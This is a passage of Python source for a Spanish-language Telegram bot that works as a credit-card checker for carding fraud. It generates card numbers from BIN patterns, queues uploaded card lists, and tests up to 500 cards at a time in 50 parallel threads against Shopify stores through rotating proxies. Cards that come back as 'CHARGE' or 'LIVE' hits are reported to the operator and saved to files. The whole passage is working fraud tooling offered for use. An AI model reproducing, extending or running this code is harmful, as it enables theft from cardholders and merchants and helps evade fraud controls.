    print(f"🌐 Sitios válidos: {len(sites)}")
    print(f"🔒 Proxies vivos: {len(proxies)}")
    
    if not sites:
        await update.message.reply_text("❌ No hay sitios válidos. Agrega con /addsh")
        return
    
    if not proxies:
        await update.message.reply_text("❌ No hay proxies vivos. Agrega con /addrproxy")
        return
    
    sites_list = [s[0] for s in sites]
    proxies_list = [p[0] for p in proxies]
    
    stop_shopify = False
    progress_msg = await update.message.reply_text(
        f"⚡ **MASS CHECK INICIADO** ⚡\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"📊 Tarjetas en cola: {len(cards)}\n"
        f"🌐 Sitios disponibles: {len(sites_list)}\n"
        f"🔒 Proxies vivos: {len(proxies_list)}\n"
        f"⚙️ Hilos: 50 (procesamiento paralelo)\n\n"
        f"⏳ Iniciando verificación masiva..."
    )
    
    results = []
    hits = []
    charge_count = 0
    live_count = 0
    captcha_count = 0
    product_empty_count = 0
    generic_error_count = 0
    timeout_count = 0
    decline_count = 0
    error_count = 0
    other_success_count = 0
    fail_count = 0
    
    start_time = time.time()
    
    # Preparar tareas para procesamiento paralelo
    tasks = []
    for cc in cards[:500]:  # Máximo 500 tarjetas
        site = random.choice(sites_list)
        proxy = random.choice(proxies_list)
        tasks.append((cc, site, proxy))
    
    # Procesamiento paralelo con ThreadPoolExecutor
    with ThreadPoolExecutor(max_workers=50) as executor:
        future_to_task = {
            executor.submit(process_single_card_mass, task, user_id): task 
            for task in tasks
        }
        
        completed = 0
        total = len(tasks)
        
        for future in as_completed(future_to_task):
            if stop_shopify:
                print(f"🛑 MASS DETENIDO por usuario")
                break
            
            task = future_to_task[future]
            try:
                result = future.result()
                results.append(result)
                
                # CLASIFICACIÓN CORREGIDA (solo por tipo)
                if result['type'] == 'CHARGE':
                    charge_count += 1
                    hits.append(result)
                    print(f"💰 CHARGE: {result['cc'][:10]}...")
                    
                    # Notificación en tiempo real
                    hit_msg = format_hit_display(
                        result['cc'], result['site'], result['proxy'], 
                        'CHARGE', result.get('price'), result.get('response')
                    )
                    await update.message.reply_text(hit_msg, parse_mode='Markdown')
                    
                elif result['type'] == 'LIVE':
                    live_count += 1
                    hits.append(result)
                    print(f"🔒 LIVE: {result['cc'][:10]}...")
                    
                    # Notificación en tiempo real
                    hit_msg = format_hit_display(
                        result['cc'], result['site'], result['proxy'], 
                        'LIVE', result.get('price'), result.get('response')
                    )
                    await update.message.reply_text(hit_msg, parse_mode='Markdown')
                    
                elif result['type'] == 'DECLINE':
                    decline_count += 1
                    print(f"❌ DECLINE: {result['cc'][:10]}...")
                    
                elif result['type'] == 'ERROR':
                    error_count += 1
                    print(f"⚠️ ERROR: {result['cc'][:10]}...")
                    
                elif result['type'] == 'CAPTCHA':
                    captcha_count += 1
                elif result['type'] == 'PRODUCT_EMPTY':
                    product_empty_count += 1
                elif result['type'] == 'GENERIC_ERROR':
                    generic_error_count += 1
                elif result['type'] == 'TIMEOUT':
                    timeout_count += 1
                elif result['status'] == 200:
                    other_success_count += 1
                else:
                    fail_count += 1
                
                completed += 1
                
                # Actualizar progreso cada 10 tarjetas
                if completed % 10 == 0 or completed == total:
                    elapsed_total = time.time() - start_time
                    percentage = (completed / total) * 100
                    bar = '█' * int(percentage/5) + '░' * (20 - int(percentage/5))
                    
                    # Calcular velocidad y ETA
                    speed = completed / elapsed_total if elapsed_total > 0 else 0
                    eta = (elapsed_total / completed) * (total - completed) if completed > 0 else 0
                    
                    try:
                        await progress_msg.edit_text(
                            f"⚡ **MASS CHECK EN PROGRESO** ⚡\n"
                            f"━━━━━━━━━━━━━━━━━━━━━\n\n"
                            f"📊 {completed}/{total} tarjetas\n"
                            f"{bar} {percentage:.1f}%\n\n"
                            f"💰 Charge: {charge_count}\n"
                            f"🔒 Live: {live_count}\n"
                            f"❌ Decline: {decline_count}\n"
                            f"⚠️ Error: {error_count}\n"
                            f"🛡️ CAPTCHA: {captcha_count}\n"
                            f"⏰ TIMEOUT: {timeout_count}\n"
                            f"⚡ Velocidad: {speed:.1f} tarjetas/s\n"
                            f"⏱️ ETA: {int(eta)}s"
                        )
                    except:
                        pass
                        
            except Exception as e:
                print(f"❌ Error procesando tarjeta: {e}")
                completed += 1
                error_count += 1
    
    # Marcar tarjetas como procesadas
    processed_cards = [r['cc'] for r in results]
    mark_queue_processed(processed_cards, user_id)
    
    elapsed_total = time.time() - start_time
    print(f"✅ MASS COMPLETADO: {len(results)} tarjetas en {elapsed_total:.1f}s")
    
    # Mensaje final con clasificación detallada
    final_msg = (
        f"{'🛑 DETENIDO' if stop_shopify else '✅ MASS CHECK COMPLETADO'}\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"📊 **RESULTADOS FINALES**\n"
        f"• Total: {len(results)}\n"
        f"• 💰 Charge: {charge_count}\n"
        f"• 🔒 Live: {live_count}\n"
        f"• ❌ Decline: {decline_count}\n"
        f"• ⚠️ Error: {error_count}\n"
        f"• 🛡️ CAPTCHA: {captcha_count}\n"
        f"• 📦 PRODUCT_EMPTY: {product_empty_count}\n"
        f"• ⏰ TIMEOUT: {timeout_count}\n"
        f"• ℹ️ Otros: {other_success_count}\n"
        f"• ⚡ Velocidad: {len(results)/elapsed_total:.1f} tarjetas/s\n"
        f"• ⏱️ Tiempo total: {int(elapsed_total)}s"
    )
    
    await progress_msg.edit_text(final_msg)
    
    # Guardar resultados completos en archivo
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    result_file = f"{RESULTS_DIR}/mass_{timestamp}.txt"
    
    with open(result_file, 'w', encoding='utf-8') as f:
        f.write(f"RESULTADOS MASS CHECK - {timestamp}\n")
        f.write("="*60 + "\n\n")
        f.write(f"RESUMEN:\n")
        f.write(f"Total: {len(results)}\n")
        f.write(f"CHARGE: {charge_count}\n")
        f.write(f"LIVE: {live_count}\n")
        f.write(f"DECLINE: {decline_count}\n")
        f.write(f"ERROR: {error_count}\n")
        f.write(f"CAPTCHA: {captcha_count}\n")
        f.write(f"TIMEOUT: {timeout_count}\n")
        f.write(f"Otros: {other_success_count}\n\n")
        f.write("="*60 + "\n")
        f.write("DETALLE POR TARJETA:\n")
        f.write("="*60 + "\n\n")
        
        for i, r in enumerate(results, 1):
            f.write(f"TARJETA #{i}\n")
            f.write("-"*40 + "\n")
            f.write(f"CC: {r['cc']}\n")
            f.write(f"Sitio: {r['site']}\n")
            f.write(f"Proxy: {r['proxy']}\n")
            f.write(f"Tipo: {r['type']}\n")
            f.write(f"Status: {r['status']}\n")
            f.write(f"Tiempo: {r['time']:.2f}s\n")
            if r.get('price'):
                f.write(f"Precio: ${r['price']}\n")
            f.write("-"*40 + "\n")
            f.write("RESPUESTA API:\n")
            f.write(f"{r['response']}\n")
            f.write("="*60 + "\n\n")
    
    # Enviar archivo de resultados
    with open(result_file, 'rb') as f:
        await update.message.reply_document(
            document=f,
            filename=f"mass_{timestamp}.txt",
            caption=f"📁 Resultados completos Mass Check ({len(results)} tarjetas)"
        )
    
    # Si hay hits, enviar archivo aparte
    if hits:
        hit_file = f"{HITS_DIR}/mass_hits_{timestamp}.txt"
        with open(hit_file, 'w', encoding='utf-8') as f:
            f.write(f"HITS DETECTADOS - {timestamp}\n")
            f.write("="*50 + "\n\n")
            for i, h in enumerate(hits, 1):
                f.write(f"HIT #{i}\n")
                f.write("-"*30 + "\n")
                f.write(f"CC: {h['cc']}\n")
                f.write(f"Tipo: {h['type']}\n")
                f.write(f"Sitio: {h['site']}\n")
                f.write(f"Precio: ${h['price']}\n" if h.get('price') else "")
                f.write(f"Respuesta: {h['response'][:200]}...\n")
                f.write("-"*30 + "\n\n")
        
        with open(hit_file, 'rb') as f:
            await update.message.reply_document(
                document=f,
                filename=f"mass_hits_{timestamp}.txt",
                caption=f"💰 {len(hits)} Hits detectados"
            )
    
    stop_shopify = False
    print(f"✅ MASS FINALIZADO")

# Función auxiliar para procesar una tarjeta (para usar con ThreadPool)
def process_single_card_mass(task, user_id):
    """Procesa una sola tarjeta para mass check (función síncrona)"""
    cc, site, proxy = task
    
    try:
        params = {'site': site, 'cc': cc, 'proxy': proxy}
        start = time.time()
        response = requests.get(API_BASE_URL, params=params, timeout=60)
        elapsed = time.time() - start
        
        response_type = analyze_response(response.text)
        price = extract_price(response.text)
        
        result = {
            'cc': cc,
            'site': site,
            'proxy': proxy,
            'status': response.status_code,
            'type': response_type,
            'time': elapsed,
            'price': price,
            'response': response.text[:500]
        }
        
        # Actualizar estadísticas
        if response.status_code == 200:
            with get_db() as conn:
                cursor = conn.cursor()
                cursor.execute('UPDATE proxies SET times_used = times_used + 1, success_count = success_count + 1, response_time = ? WHERE proxy = ?', (elapsed, proxy))
                cursor.execute('UPDATE sites SET times_used = times_used + 1, success_count = success_count + 1, products_found = products_found + ? WHERE site = ?', (1 if price else 0, site))
                conn.commit()
        else:
            with get_db() as conn:
                cursor = conn.cursor()
                cursor.execute('UPDATE proxies SET times_used = times_used + 1, fail_count = fail_count + 1 WHERE proxy = ?', (proxy,))
                cursor.execute('UPDATE sites SET times_used = times_used + 1, fail_count = fail_count + 1 WHERE site = ?', (site,))
                conn.commit()
        
        return result
        
    except requests.exceptions.Timeout:
        return {
            'cc': cc,
            'site': site,
            'proxy': proxy,
            'status': 408,
            'type': 'TIMEOUT',
            'time': 60,
            'response': 'Timeout'
        }
    except Exception as e:
        return {
            'cc': cc,
            'site': site,
            'proxy': proxy,
            'status': 0,
            'type': 'ERROR',
            'time': 0,
            'response': str(e)[:200]
        }

# ===== NUEVOS COMANDOS PARA VACIAR TODO =====
async def delproxyall_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Elimina TODOS los proxies del usuario"""
    user_id = update.effective_user.id
    
    # Obtener cantidad antes de eliminar
    proxies = get_all_proxies(only_alive=False)
    count = len(proxies)
    
    if count == 0:
        await update.message.reply_text("📭 No hay proxies para eliminar")
        return
    
    # Eliminar todos los proxies
    deleted = delete_all_proxies(user_id)
    
    await update.message.reply_text(
        f"🗑️ **PROXIES VACIADOS**\n\n"
        f"✅ Se eliminaron {deleted} proxies.\n"
        f"📊 La lista de proxies ahora está vacía.",
        parse_mode='Markdown'
    )

async def delsiteall_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Elimina TODOS los sitios del usuario"""
    user_id = update.effective_user.id
    
    # Obtener cantidad antes de eliminar
    sites = get_all_sites(only_valid=False)
    count = len(sites)
    
    if count == 0:
        await update.message.reply_text("📭 No hay sitios para eliminar")
        return
    
    # Eliminar todos los sitios
    deleted = delete_all_sites(user_id)
    
    await update.message.reply_text(
        f"🗑️ **SITIOS VACIADOS**\n\n"
        f"✅ Se eliminaron {deleted} sitios.\n"
        f"📊 La lista de sitios ahora está vacía.",
        parse_mode='Markdown'
    )

async def delcardall_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Elimina TODAS las tarjetas generadas del usuario"""
    user_id = update.effective_user.id
    
    # Obtener cantidad antes de eliminar
    cards = get_generated_cards(user_id)
    count = len(cards)
    
    if count == 0:
        await update.message.reply_text("📭 No hay tarjetas generadas para eliminar")
        return
    
    # Eliminar todas las tarjetas
    deleted = delete_all_generated_cards(user_id)
    
    await update.message.reply_text(
        f"🗑️ **TARJETAS VACIADAS**\n\n"
        f"✅ Se eliminaron {deleted} tarjetas generadas.\n"
        f"📊 La lista de tarjetas ahora está vacía.",
        parse_mode='Markdown'
    )

async def delqueueall_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Elimina TODAS las tarjetas de la cola del usuario"""
    user_id = update.effective_user.id
    
    # Obtener cantidad antes de eliminar
    count = get_queue_count(user_id)
    
    if count == 0:
        await update.message.reply_text("📭 La cola ya está vacía")
        return
    
    # Eliminar todas las tarjetas de la cola
    deleted = clear_all_queue(user_id)
    
    await update.message.reply_text(
        f"🗑️ **COLA VACIADA**\n\n"
        f"✅ Se eliminaron {deleted} tarjetas de la cola.\n"
        f"📊 La cola ahora está vacía.",
        parse_mode='Markdown'
    )

# ===== COMANDOS BÁSICOS =====
async def register(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    register_user(user.id, user.username or "user", user.first_name or "User")
    await update.message.reply_text("✅ **REGISTRO EXITOSO**\n\n¡Bienvenido!")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not is_approved(user.id):
        await update.message.reply_text("❌ ACCESO DENEGADO\n\nUsa /register")
        return
    
    proxies_alive, proxies_dead = get_proxy_count()
    sites_valid, sites_invalid = get_site_count()
    queue_count = get_queue_count(user.id)
    
    message = (
        f"# {BOT_NAME}\n\n"
        f"📊 **ESTADÍSTICAS**\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"🟢 Proxies vivos: {proxies_alive}\n"
        f"🔴 Proxies muertos: {proxies_dead}\n"
        f"✅ Sitios válidos: {sites_valid}\n"
        f"❌ Sitios inválidos: {sites_invalid}\n"
        f"💳 Tarjetas en cola: {queue_count}\n\n"
        f"**COMANDOS**\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"🔍 /chk <cc> - CHK individual\n"
        f"⚡ /mass - Multi-CHK con cola\n"
        f"✨ /gen <patrón> [cantidad] - Generar CCs\n"
        f"➕ /addsh <url> - Agregar sitio\n"
        f"➕ /addrproxy <proxy> - Agregar proxy\n"
        f"📋 /mysites - Ver sitios\n"
        f"📋 /myproxies - Ver proxies\n"
        f"💳 /mycards - Ver tarjetas\n"
        f"📊 /queue - Ver cola\n\n"
        f"**🗑️ ELIMINAR (1 por 1):**\n"
        f"• /delsite <n> - Eliminar sitio\n"
        f"• /delproxy <n> - Eliminar proxy\n"
        f"• /delcard <n> - Eliminar tarjeta\n"
        f"• /delqueue <n> - Eliminar de cola\n\n"
        f"**🗑️ VACIAR TODO:**\n"
        f"• /delsiteall - Vaciar TODOS los sitios\n"
        f"• /delproxyall - Vaciar TODOS los proxies\n"
        f"• /delcardall - Vaciar TODAS las tarjetas\n"
        f"• /delqueueall - Vaciar TODA la cola\n\n"
        f"🩺 /ultrahealth - Health Check ultra rápido\n"
        f"🔌 /testapi - Probar API"
    )
    
    keyboard = [
        [InlineKeyboardButton("⚡ ULTRA HEALTH", callback_data='ultra_health'),
         InlineKeyboardButton("📁 ARCHIVOS", callback_data='files')],
        [InlineKeyboardButton("📊 ESTADÍSTICAS", callback_data='stats'),
         InlineKeyboardButton("❓ AYUDA", callback_data='help')]
    ]
    
    await update.message.reply_text(message, reply_markup=InlineKeyboardMarkup(keyboard))

async def addsh_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("❌ **Uso:** /addsh <url>\nEjemplo: /addsh store.myshopify.com")
        return
    site = ' '.join(context.args)
    if add_site(site, update.effective_user.id):
        await update.message.reply_text(f"✅ Sitio agregado: `{site}`")
    else:
        await update.message.reply_text("⚠️ El sitio ya existe")

async def addrproxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("❌ **Uso:** /addrproxy <proxy>")
        return
    proxy = ' '.join(context.args)
    if add_proxy(proxy, update.effective_user.id):
        await update.message.reply_text(f"✔ Proxy agregado: `{proxy[:30]}...`")
    else:
        await update.message.reply_text("⚠️ El proxy ya existe")

async def testapi_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = await update.message.reply_text("🔄 Probando API...")
    try:
        start = time.time()
        response = requests.get(API_BASE_URL, params={'test': '1'}, timeout=10)
        elapsed = time.time() - start
        await msg.edit_text(
            f"**API RESPONDE**\n\n"
            f"📟 Código: {response.status_code}\n"
            f"⚡ Tiempo: {elapsed:.2f}s\n"
            f"📝 Respuesta: `{response.text[:100]}`"
        )
    except Exception as e:
        await msg.edit_text(f"❌ Error: {str(e)[:100]}")

async def mysites_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    sites = get_all_sites(only_valid=False)
    if not sites:
        await update.message.reply_text("📭 No hay sitios guardados")
        return
    valid, invalid = get_site_count()
    msg = f"🌐 **SITIOS GUARDADOS** (✅ {valid} | ❌ {invalid})\n━━━━━━━━━━━━━━━━━━━━━\n\n"
    for i, s in enumerate(sites[:20], 1):
        status = "✅" if s[3] else "❌"
        products = s[4]
        product_icon = "📦" if products > 0 else "⏳"
        msg += f"{i}. {status}{product_icon} `{s[0][:50]}...`\n"
    if len(sites) > 20:
        msg += f"\n... y {len(sites)-20} más"
    msg += "\n\nPara eliminar: /delsite <número>"
    await update.message.reply_text(msg, parse_mode='Markdown')

async def myproxies_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    proxies = get_all_proxies(only_alive=False)
    if not proxies:
        await update.message.reply_text("📭 No hay proxies guardados")
        return
    alive, dead = get_proxy_count()
    msg = f"🔒 **PROXIES GUARDADOS** (🟢 {alive} | 🔴 {dead})\n━━━━━━━━━━━━━━━━━━━━━\n\n"
    for i, p in enumerate(proxies[:20], 1):
        status = "🟢" if p[3] else "🔴"
        response_time = p[4]
        time_str = f" ⚡ {response_time}s" if response_time else ""
        msg += f"{i}. {status} `{p[0][:30]}...`{time_str}\n"
    if len(proxies) > 20:
        msg += f"\n... y {len(proxies)-20} más"
    msg += "\n\nPara eliminar: /delproxy <número>"
    await update.message.reply_text(msg, parse_mode='Markdown')

async def gen_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if not args:
        await update.message.reply_text(
            "✨ **GENERADOR DE CCS**\n\n"
            "**Uso:** `/gen <patrón> [cantidad]`\n\n"
            "**Patrón:** `BIN|MM|AA|CVV`\n"
            "• `BIN` - Usa `x` para dígitos aleatorios\n"
            "• `MM` - Mes (`rnd` para aleatorio)\n"
            "• `AA` - Año (`rnd` para aleatorio)\n"
            "• `CVV` - CVV (`rnd` para aleatorio)\n\n"
            "**Ejemplos:**\n"
            "• `/gen 451993217159xxxx|02|2030|rnd`\n"
            "• `/gen 451993xxxxxx|rnd|rnd|rnd 15`"
        )
        return
    
    pattern = args[0]
    count = min(int(args[1]) if len(args) > 1 else 10, 50)
    
    cards = generate_cc(pattern, count)
    if not cards:
        await update.message.reply_text("❌ Patrón inválido")
        return
    
    saved = save_generated_cards(cards, pattern, update.effective_user.id)
    
    msg = f"✨ **{saved} TARJETAS GENERADAS** ✨\n━━━━━━━━━━━━━━━━━━━━━\n\n"
    for card in cards[:10]:
        msg += f"`{card}`\n"
    if len(cards) > 10:
        msg += f"... y {len(cards)-10} más\n"
    msg += f"\n📌 Guardadas en /mycards\n"
    msg += f"📥 Para usar en /mass, agrégalas a la cola con /queue"
    
    await update.message.reply_text(msg)

async def mycards_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    cards = get_generated_cards(user_id, 20)
    if not cards:
        await update.message.reply_text("📭 No tienes tarjetas guardadas")
        return
    msg = "💳 **TUS TARJETAS GENERADAS**\n━━━━━━━━━━━━━━━━━━━━━\n\n"
    for i, c in enumerate(cards, 1):
        status = "✅" if c[3] else "⏳"
        msg += f"{i}. {status} `{c[0]}`\n"
    msg += "\n📌 Para usar en /mass, agrégalas a la cola"
    await update.message.reply_text(msg)

async def queue_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    count = get_queue_count(user_id)
    cards = get_queue_cards(user_id, 20)
    
    msg = f"📊 **COLA DE TARJETAS** ({count} tarjetas)\n━━━━━━━━━━━━━━━━━━━━━\n\n"
    
    if cards:
        for i, c in enumerate(cards, 1):
            msg += f"{i}. `{c}`\n"
        msg += f"\n⚡ Usa /mass para procesar estas {count} tarjetas\n"
        msg += f"🗑️ Usa /delqueueall para vaciar toda la cola"
    else:
        msg += "No hay tarjetas en cola\n\n"
        msg += "Para agregar:\n"
        msg += "• Envía un archivo cards.txt\n"
        msg += "• Usa /gen para generar y luego agrega"
    
    await update.message.reply_text(msg)

async def delsite_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if not args:
        await update.message.reply_text("❌ **Uso:** /delsite <número>\nEj: /delsite 1")
        return
    try:
        index = int(args[0])
        deleted = delete_site_by_index(index, update.effective_user.id)
        if deleted:
            await update.message.reply_text(f"✅ Sitio eliminado")
        else:
            await update.message.reply_text("❌ Número inválido")
    except:
        await update.message.reply_text("❌ Número inválido")

async def delproxy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if not args:
        await update.message.reply_text("❌ **Uso:** /delproxy <número>\nEj: /delproxy 1")
        return
    try:
        index = int(args[0])
        deleted = delete_proxy_by_index(index, update.effective_user.id)
        if deleted:
            await update.message.reply_text(f"✅ Proxy eliminado")
        else:
            await update.message.reply_text("❌ Número inválido")
    except:
        await update.message.reply_text("❌ Número inválido")

async def delcard_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if not args:
        await update.message.reply_text("❌ **Uso:** /delcard <número>\nEj: /delcard 1")
        return
    try:
        index = int(args[0])
        deleted = delete_generated_card_by_index(index, update.effective_user.id)
        if deleted:
            await update.message.reply_text(f"✅ Tarjeta eliminada")
        else:
            await update.message.reply_text("❌ Número inválido")
    except:
        await update.message.reply_text("❌ Número inválido")

async def delqueue_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if not args:
        await update.message.reply_text("❌ **Uso:** /delqueue <número>\nEj: /delqueue 1")
        return
    try:
        index = int(args[0])
        deleted = delete_from_queue_by_index(index, update.effective_user.id)
        if deleted:
            await update.message.reply_text(f"✅ Tarjeta eliminada de cola")
        else:
            await update.message.reply_text("❌ Número inválido")
    except:
        await update.message.reply_text("❌ Número inválido")

# ===== MANEJADOR DE BOTONES =====
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == 'ultra_health':
        await ultra_healthcheck(update, context)
    elif query.data == 'files':
        await query.edit_message_text(
            "📁 **ARCHIVOS**\n\n"
            "**Formatos aceptados:**\n\n"
            "📄 **sites.txt**\n"
            "• Una URL por línea\n"
            "• Ej: `store.myshopify.com`\n\n"
            "📄 **proxies.txt**\n"
            "• Formatos: host:port o user:pass@host:port\n"
            "• Ej: `45.155.88.66:7497:user:pass`\n\n"
            "📄 **cards.txt**\n"
            "• Formato: número|mes|año|cvv\n"
            "• Ej: `4111111111111111|12|2025|123`"
        )
    elif query.data == 'stats':
        user_id = update.effective_user.id
        sites_valid, sites_invalid = get_site_count()
        proxies_alive, proxies_dead = get_proxy_count()
        queue_count = get_queue_count(user_id)
        await query.edit_message_text(
            f"📊 **ESTADÍSTICAS**\n\n"
            f"👥 Usuarios registrados: {get_user_count()}\n"
            f"🟢 Proxies vivos: {proxies_alive}\n"
            f"🔴 Proxies muertos: {proxies_dead}\n"
            f"✅ Sitios válidos: {sites_valid}\n"
            f"❌ Sitios inválidos: {sites_invalid}\n"
            f"💳 Tarjetas en tu cola: {queue_count}"
        )
    elif query.data == 'help':
        await query.edit_message_text(
            "❓ **AYUDA RÁPIDA**\n\n"
            "**Comandos principales:**\n"
            "🔍 `/chk <cc>` - CHK individual\n"
            "⚡ `/mass` - Multi-CHK con cola\n"
            "✨ `/gen <patrón>` - Generar CCs\n"
            "➕ `/addsh <url>` - Agregar sitio\n"
            "➕ `/addrproxy <proxy>` - Agregar proxy\n"
            "📋 `/mysites` - Ver sitios\n"
            "📋 `/myproxies` - Ver proxies\n"
            "💳 `/mycards` - Ver tarjetas\n"
            "📊 `/queue` - Ver cola\n\n"
            "**Eliminar (1 por 1):**\n"
            "• `/delsite <n>`\n"
            "• `/delproxy <n>`\n"
            "• `/delcard <n>`\n"
            "• `/delqueue <n>`\n\n"
            "**Vaciar todo:**\n"
            "• `/delsiteall` - Vaciar sitios\n"
            "• `/delproxyall` - Vaciar proxies\n"
            "• `/delcardall` - Vaciar tarjetas\n"
            "• `/delqueueall` - Vaciar cola"
        )
    elif query.data == 'clean_proxies':
        deleted = delete_all_dead_proxies()
        await query.edit_message_text(f"🧹 Proxies muertos eliminados: {deleted}")

# ===== MANEJADOR DE ARCHIVOS =====
async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    doc = update.message.document
    user_id = update.effective_user.id
    filename = doc.file_name.lower()
    
    if not filename.endswith('.txt'):
        await update.message.reply_text("❌ Solo archivos .txt")
        return
    
    file = await context.bot.get_file(doc.file_id)
    await file.download_to_drive('temp.txt')
    
    with open('temp.txt', 'r', encoding='utf-8', errors='ignore') as f:
        lines = [l.strip() for l in f if l.strip()]
    
    if not lines:
        await update.message.reply_text("❌ Archivo vacío")
        os.remove('temp.txt')
        return
    
    # Detectar tipo por nombre o contenido
    if 'site' in filename:
        # Archivo de sitios
        added = 0
        invalid = 0
        for line in lines:
            site = parse_site_line(line)
            if site and add_site(site, user_id):
                added += 1
            else:
                invalid += 1
        await update.message.reply_text(f"✅ Sitios agregados: {added}\n⚠️ Inválidos: {invalid}")
        
    elif 'proxy' in filename:
        # Archivo de proxies
        added = 0
        invalid = 0
        for line in lines:
            proxy = parse_proxy_line(line)
            if proxy and add_proxy(proxy, user_id):
                added += 1
            else:
                invalid += 1
        await update.message.reply_text(f"✅ Proxies agregados: {added}\n⚠️ Inválidos: {invalid}")
        
    else:
        # Archivo de tarjetas (por defecto)
        cards = []
        invalid = 0
        for line in lines:
            cc = parse_cc_line(line)
            if cc:
                cards.append(cc)
            else:
                invalid += 1
        
        if cards:
            queued = add_to_queue(cards, user_id)
            queue_total = get_queue_count(user_id)
            await update.message.reply_text(
                f"✅ **TARJETAS CARGADAS**\n\n"
                f"📄 Archivo: {doc.file_name}\n"
                f"✅ Válidas: {len(cards)}\n"
                f"⚠️ Inválidas: {invalid}\n"
                f"📥 En cola: {queued}\n"
                f"📊 Total cola: {queue_total}\n\n"
                f"⚡ Usa /mass para procesar\n"
                f"🗑️ Usa /delqueueall para vaciar la cola"
            )
        else:
            await update.message.reply_text(
                "❌ **NO SE DETECTARON TARJETAS**\n\n"
                "Formato esperado: `4111111111111111|12|2025|123`\n"
                "Separadores aceptados: | , ; espacio / :"
            )
    
    os.remove('temp.txt')

# ===== FUNCIÓN PRINCIPAL =====
def main():
    print(f"╔════════════════════════════╗")
    print(f"║     🤖 {BOT_NAME}          ║")
    print(f"║    🚀 INICIANDO...         ║")
    print(f"╚════════════════════════════╝")
    
    init_database()
    
    app = Application.builder().token(TOKEN).build()
    
    # Registrar TODOS los comandos
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("register", register))
    app.add_handler(CommandHandler("chk", chk_command))
    app.add_handler(CommandHandler("mass", mass_command))
    app.add_handler(CommandHandler("addsh", addsh_command))
    app.add_handler(CommandHandler("addrproxy", addrproxy_command))
    app.add_handler(CommandHandler("testapi", testapi_command))
    app.add_handler(CommandHandler("ultrahealth", ultra_healthcheck))
    app.add_handler(CommandHandler("mysites", mysites_command))
    app.add_handler(CommandHandler("myproxies", myproxies_command))
    app.add_handler(CommandHandler("gen", gen_command))
    app.add_handler(CommandHandler("mycards", mycards_command))
    app.add_handler(CommandHandler("queue", queue_command))
    app.add_handler(CommandHandler("delsite", delsite_command))
    app.add_handler(CommandHandler("delproxy", delproxy_command))
    app.add_handler(CommandHandler("delcard", delcard_command))
    app.add_handler(CommandHandler("delqueue", delqueue_command))
    
    # NUEVOS COMANDOS PARA VACIAR TODO
    app.add_handler(CommandHandler("delproxyall", delproxyall_command))
    app.add_handler(CommandHandler("delsiteall", delsiteall_command))
    app.add_handler(CommandHandler("delcardall", delcardall_command))
    app.add_handler(CommandHandler("delqueueall", delqueueall_command))
    
    # Callback para botones
    app.add_handler(CallbackQueryHandler(button_handler))
    
    # Manejador de archivos
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    
    print(f"✅ {BOT_NAME} listo!")
    print(f"✅ Comandos registrados: {len(app.handlers[0])}")
    print(f"✅ MASS en paralelo con 50 hilos")
    print(f"✅ Clasificación CORREGIDA (solo campo Response)")
    print(f"✅ Tipos: Charge | Live | Decline | Error | CAPTCHA | TIMEOUT")
    print(f"✅ Notificaciones en tiempo real para Hits")
    print(f"✅ Nuevos comandos: /delproxyall, /delsiteall, /delcardall, /delqueueall")
    app.run_polling()

if __name__ == "__main__":
    main()
